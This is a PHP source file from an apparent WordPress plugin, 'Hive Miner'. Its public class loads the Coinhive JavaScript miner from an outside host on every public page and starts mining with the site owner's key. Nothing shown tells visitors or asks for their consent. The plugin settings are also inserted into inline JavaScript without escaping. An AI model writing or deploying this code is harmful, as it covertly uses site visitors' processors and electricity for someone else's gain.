<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @link       http://devoncmather.com
 * @since      1.0.0
 *
 * @package    Hive_Miner
 * @subpackage Hive_Miner/public
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the public-facing stylesheet and JavaScript.
 *
 * @package    Hive_Miner
 * @subpackage Hive_Miner/public
 * @author     Your Name <email@example.com>
 */
class Hive_Miner_Public {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of the plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;

	}

	/**
	 * Register the stylesheets for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Hive_Miner_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Hive_Miner_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/hive-miner-public.css', array(), $this->version, 'all' );

	}

	/**
	 * Register the JavaScript for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Hive_Miner_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Hive_Miner_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_script('coin-hive', 'https://coin-hive.com/lib/coinhive.min.js', array(), $this->version, false );

		wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/hive-miner-public.js', array( 'jquery' ), $this->version, false );


		$public_key = get_option('hive_miner_public_key');
		$target_hashes = get_option('hive_miner_target_hashes');

		$customJs = '';
		if($target_hashes){
			$customJs .= "var miner = new CoinHive.Token('$public_key', '$target_hashes');";
		}
		else {
			$customJs .= "var miner = new CoinHive.Anonymous('$public_key');";
		}
		$customJs .= "miner.start();";

   		wp_add_inline_script( 'coin-hive', $customJs);


	}

}
